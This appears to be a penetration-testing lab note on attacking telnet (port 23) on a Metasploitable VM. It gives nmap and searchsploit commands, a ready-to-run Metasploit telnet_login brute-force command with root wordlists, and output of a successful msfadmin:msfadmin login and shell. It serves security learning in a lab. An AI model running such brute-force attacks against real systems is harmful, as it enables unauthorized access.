### TELNET (PORT 23) - CHECK

This port is an old way of doing remote session, since 2000
people are using ssh rather than using telnet as a remote 
session login solution.

**Nmap scan**
````
$ nmap -p 23 192.168.56.101
````

*Port 23 // scan results*
````
Nmap scan report for 192.168.56.101 (192.168.56.101)
Host is up (0.00040s latency).

PORT   STATE SERVICE
23/tcp open  telnet
````
**Searchsploit**
````
$ searchsploit telnet login
````

````
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
Beck IPC GmbH IPC@CHIP - TelnetD Login Account Brute Force     | multiple/remote/20881.txt
--------------------------------------------------------------- ---------------------------------
````

**Metasploitable**
````
$ msfconsole -q -x 'use auxiliary/scanner/telnet/telnet_login;set USER_FILE /usr/share/metasploit-framework/data/wordlists/root_users.txt;set PASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt;set RHOSTS 192.168.56.101;set RPORT 23;exploit'

````
**Output**
````
[!] 192.168.56.101:23     - No active DB -- Credential data will not be saved!
[+] 192.168.56.101:23     - 192.168.56.101:23 - Login Successful: msfadmin:msfadmin
[*] 192.168.56.101:23     - Attempting to start session 192.168.56.101:23 with msfadmin:msfadmin
[*] Command shell session 3 opened (0.0.0.0:0 -> 192.168.56.101:23) at 2020-11-11 07:02:56 -0500
[-] 192.168.56.101:23     - 192.168.56.101:23 - LOGIN FAILED: user:msfadmin (Incorrect: )
[*] 192.168.56.101:23     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
````

**Telnet login**
````
$ telnet 192.168.56.101
````

````
Trying 192.168.56.101...
Connected to 192.168.56.101.
Login with msfadmin/msfadmin to get started
metasploitable login: msfadmin
Password:(msfadmin)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
msfadmin@metasploitable:~$ 
````
